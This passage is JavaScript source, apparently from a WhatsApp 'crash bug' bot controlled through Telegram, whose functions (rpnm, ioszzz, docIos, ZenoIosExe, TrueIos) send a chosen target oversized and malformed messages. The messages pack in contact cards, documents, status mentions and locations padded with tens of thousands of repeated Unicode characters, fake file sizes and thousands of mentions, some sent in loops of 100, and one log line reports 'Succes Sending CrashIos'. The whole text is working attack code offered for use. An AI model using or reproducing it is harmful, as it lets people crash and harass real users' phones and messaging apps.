  for(let y = 0; y < 100; y++) {
    var vicart = `BEGIN:VCARD\nVERSION:3.0\nN:;;;;FN:👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️\nitem1.TEL;waid=13135550202:+1 (313) 555-0202\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:${img}\nX-WA-BIZ-DESCRIPTION:👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️\nX-WA-BIZ-NAME:👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️\nEND:VCARD`;
    contacts.push({
      displayName: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️", 
      vcard: vicart
    })
  }
  await sock.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      contacts: contacts, 
      contextInfo: {
        isForwarded: true, 
        forwardingScore: 999,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550202@s.whatsapp.net"
        }, 
        quotedAd: {
          advertiserName: "7eppeli", 
          thumbnail: ZeppImg, 
          caption: "???"
        }, 
        placeKeyHolder: {
          participant: "13135550202@s.whatsapp.net", 
          id: "7EPP3LI-192720DBJA", 
          fromMe: false
        }, 
        externalAdReply: {
          body: "𑇂𑆵𑆴𑆿".repeat(9000), 
          title: "𑇂𑆵𑆴𑆿".repeat(9000),
          thumbnail: ZeppImg, 
          thumbnailUrl: "https://t.me/YuukeyD7eppeli", 
          mediaType: 1,
          sourceUrl: "https://t.me/YuukeyD7eppeli"
        },
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "CONNECTED",
            durationSecs: "10",
            callType: "SCHEDULED_CALL",
            participants: [
              {
                jid: "13135550202@s.whatsapp.net",
                callOutcome: "SILENCED_UNKOWN_CALLER",
              },
              {
                jid: target,
                callOutcome: "SILENCED_BY_DND",
              }
            ]
          }
        }
      }
    }
  }, {
    participant: {
      jid:target
    }
  });
}
async function rpnm(target) {
  await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "7eppeli.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
          title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/YuukeyD7eppeli",
         mediaUrl: "https://t.me/YuukeyD7eppeli",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        }
      }
    }
  }, {
   participant: { jid: target }
 });
}

async function ioszzz(target) {
  const msg = generateWAMessageFromContent(target, {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/559886257_1439249307149698_107671559551181094_n.enc?ccb=11-4&oh=01_Q5Aa2gEDdfCH-7m2Rp7FpsoS9Ow0p4ALu-6LPHpWDg_6UeGR8Q&oe=6909EB68&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(50), 
      fileSha256: "veKnW89ZgL0MjV5wVCUAjNoVLuUmucu0UMs+8xUtQAI=",
      fileLength: 99999999999999,
      pageCount: 99999999999999,
      mediaKey: "69Oz8Rzlexpw7x4hpQsuzgtASOlEZf6s6pyc9YqrXjo=",
      fileName: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
      fileEncSha256: "D4LL/b8fdt+q0LedfJa5qpfo6D3ccBAlurexZPQ9Sf0=",
      directPath: "/v/t62.7119-24/559886257_1439249307149698_107671559551181094_n.enc?ccb=11-4&oh=01_Q5Aa2gEDdfCH-7m2Rp7FpsoS9Ow0p4ALu-6LPHpWDg_6UeGR8Q&oe=6909EB68&_nc_sid=5e03e0&_nc_hot=1759669435",
      mediaKeyTimestamp: "1759591872",
      thumbnailDirectPath: "/v/t62.36145-24/560563266_1182091507314177_4487430912428629502_n.enc?ccb=11-4&oh=01_Q5Aa2gG3JeeF4eDKCSo_6O4YFwgV8JNjpM4xlpk7Dus5lLDCRg&oe=6909CF33&_nc_sid=5e03e0",
      thumbnailSha256: "dSzZNpjU8u5CHKC/tuwscfQqcpT2yHnXVqPLjZOeoa0=",
      thumbnailEncSha256: "+rSnEA0smdAv8IOQ8b2vS/yNbieDhk3pozmPFc2T7M8=",
      jpegThumbnail: ZeppImg,
      contextInfo: {
        statusSourceType: "TEXT", 
        statusAttributionType: "RESHARED_FROM_MENTION", 
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "7eppeli.pdf",
              songId: "1137812656623908",
              title: "𑇂𑆵𑆴𑆿".repeat(9000),
              author: "𑇂𑆵𑆴𑆿".repeat(9000),
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              isExplicit: true
            }
          }
        ]
      }, 
      thumbnailHeight: 44,
      thumbnailWidth: 72
    }
  }, {})
  
  const msg2 = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: `👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️\nhttps://t.me/Zeppeli_Exposed\n${"𑇂𑆵𑆴𑆿".repeat(20000)}`, 
      matchedText: "https://t.me/Zeppeli_Exposed",
      description: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
      title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️", 
      textArgb: Math.random() * 2000,
      backgroundArgb: Math.random() * 2000,
      font: "SYSTEM", 
      inviteLinkGroupType: "DEFAULT", 
      jpegThumbnail: ZeppImg, 
      contextInfo: {
        statusSourceType: "TEXT", 
        statusAttributionType: "RESHARED_FROM_MENTION", 
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "7eppeli.pdf",
              songId: "1137812656623908",
              title: "𑇂𑆵𑆴𑆿".repeat(9000),
              author: "𑇂𑆵𑆴𑆿".repeat(9000),
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              isExplicit: true
            }
          }
        ]
      }
    }
  }, {})
  
  const msg3 = generateWAMessageFromContent(target, {
    locationMessage: {
      degreesLatitude: 0,
      degreesLongitude: 0,
      name: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
      address: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️", 
      url: "https://t.me/YuukeyD7eppeli", 
      jpegThumbnail: ZeppImg, 
      contextInfo: {
        statusSourceType: "TEXT", 
        statusAttributionType: "RESHARED_FROM_MENTION", 
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "7eppeli.pdf",
              songId: "1137812656623908",
              title: "𑇂𑆵𑆴𑆿".repeat(9000),
              author: "𑇂𑆵𑆴𑆿".repeat(9000),
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              isExplicit: true
            }
          }
        ]
      }
    }
  }, {})
  
  const msg4 = generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        externalAdReply: {
          title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
          body: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️", 
          renderLargerThumbnail: true, 
          showAdAttribution: true, 
          sourceUrl: `https${"𑇂𑆵𑆴𑆿".repeat(20000)}.id`, 
          thumbnailUrl: "https://files.catbox.moe/okn68z.jpg", 
          mediaType: 1
        },
        quotedAd: {
          advertiserName: "𑇂𑆵𑆴𑆿".repeat(20000),
          caption: "𑇂𑆵𑆴𑆿".repeat(20000), 
          jpegThumbnail: ZeppImg, 
          mediaType: 1
        }, 
        placeKeyHolder: {
          remoteJid: "status@broadcast", 
          fromMe: true, 
          id: sock.generateMessageTag(), 
          participant: target
        }, 
        statusSourceType: "TEXT", 
        statusAttributionType: "RESHARED_FROM_MENTION", 
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "7eppeli.pdf",
              songId: "1137812656623908",
              title: "𑇂𑆵𑆴𑆿".repeat(9000),
              author: "𑇂𑆵𑆴𑆿".repeat(9000),
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              isExplicit: true
            }
          }
        ]
      }
    }
  }, {})
  
  await sock.relayMessage("status@broadcast", msg4.message, {
    statusJidList: [target], 
    messageId: msg4.key.id, 
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }
        ]
      }]
    }]
  })
  
  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target], 
    messageId: msg.key.id, 
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }
        ]
      }]
    }]
  })
  
  await sock.relayMessage("status@broadcast", msg2.message, {
    statusJidList: [target], 
    messageId: msg2.key.id, 
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }
        ]
      }]
    }]
  })
  
  await sock.relayMessage("status@broadcast", msg3.message, {
    statusJidList: [target], 
    messageId: msg3.key.id, 
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [
          {
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }
        ]
      }]
    }]
  })
}

async function docIos(target) {
  const msg = generateWAMessageFromContent(target, {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/559886257_1439249307149698_107671559551181094_n.enc?ccb=11-4&oh=01_Q5Aa2gEDdfCH-7m2Rp7FpsoS9Ow0p4ALu-6LPHpWDg_6UeGR8Q&oe=6909EB68&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(50), 
      fileSha256: "veKnW89ZgL0MjV5wVCUAjNoVLuUmucu0UMs+8xUtQAI=",
      fileLength: 99999999999999,
      pageCount: 99999999999999,
      mediaKey: "69Oz8Rzlexpw7x4hpQsuzgtASOlEZf6s6pyc9YqrXjo=",
      fileName: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000),
      fileEncSha256: "D4LL/b8fdt+q0LedfJa5qpfo6D3ccBAlurexZPQ9Sf0=",
      directPath: "/v/t62.7119-24/559886257_1439249307149698_107671559551181094_n.enc?ccb=11-4&oh=01_Q5Aa2gEDdfCH-7m2Rp7FpsoS9Ow0p4ALu-6LPHpWDg_6UeGR8Q&oe=6909EB68&_nc_sid=5e03e0&_nc_hot=1759669435",
      mediaKeyTimestamp: "1759591872",
      thumbnailDirectPath: "/v/t62.36145-24/560563266_1182091507314177_4487430912428629502_n.enc?ccb=11-4&oh=01_Q5Aa2gG3JeeF4eDKCSo_6O4YFwgV8JNjpM4xlpk7Dus5lLDCRg&oe=6909CF33&_nc_sid=5e03e0",
      thumbnailSha256: "dSzZNpjU8u5CHKC/tuwscfQqcpT2yHnXVqPLjZOeoa0=",
      thumbnailEncSha256: "+rSnEA0smdAv8IOQ8b2vS/yNbieDhk3pozmPFc2T7M8=",
      jpegThumbnail: ZeppImg, 
      contextInfo: {
        quotedMessage: {
          callLogMessage: {
            isVideo: true, 
            callOutcome: 1, 
            durationSecs: "16000", 
            callType: 1,
            participants: [
              {
                jid: target, 
                callOutcome: 1
              }, 
              {
                jid: "13135550202@s.whatsapp.net", 
                callOutcome: 1
              }
            ]
          }
        }
      }, 
      thumbnailHeight: 44,
      thumbnailWidth: 72
    }
  }, {})
  
  await sock.relayMessage(target, msg.message, {
    participant: {
      jid:target
    }, 
    messageId: msg.key.id
  })
}

async function ZenoIosExe(target) {
  for (let r = 0; r < 100; r++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
      text: "🧪⃟꙰ 𝗫 - 𝗭 𝗘 𝗡 𝗢" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      matchedText: "𑇂𑆵𑆴𑆿".repeat(15000),
      contextInfo: {
        stanzaId: target,
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [
              {
                jid: "6285769675679@s.whatsapp.net",
                callOutcome: "1",
              },
            ],
          },
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1844000
          },
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING",
        },
        quotedAd: {
          advertiserName: "Example Adver",
          mediaType: "IMAGE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
          caption: "𑇂𑆵𑆴𑆿".repeat(5000),
        },
        placeholderKey: {
          remoteJid: "0s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
      },
      inviteLinkGroupTypeV2: 1,
    },
  }, { participant: { jid: target } });
  console.log(chalk.red(`─────「 ⏤Succes Sending CrashIos⏤ 」─────`));
  await sleep(2500);
  }
}

async function TrueIos(target) {
  await xata.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        locationMessage: {
          degreesLatitude: 999.27838,
          degreesLongitude: -127.929,
          name: `X` + "𑇂𑆵𑆴𑆿".repeat(60000),
          url: null,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `628${z + 1}@s.whatsapp.net`
            ),
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "Video",
                jpegThumbnail: null,
                caption: "𑇂𑆵𑆴𑆿".repeat(60000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

// --- Jalankan Bot ---
bot.launch();
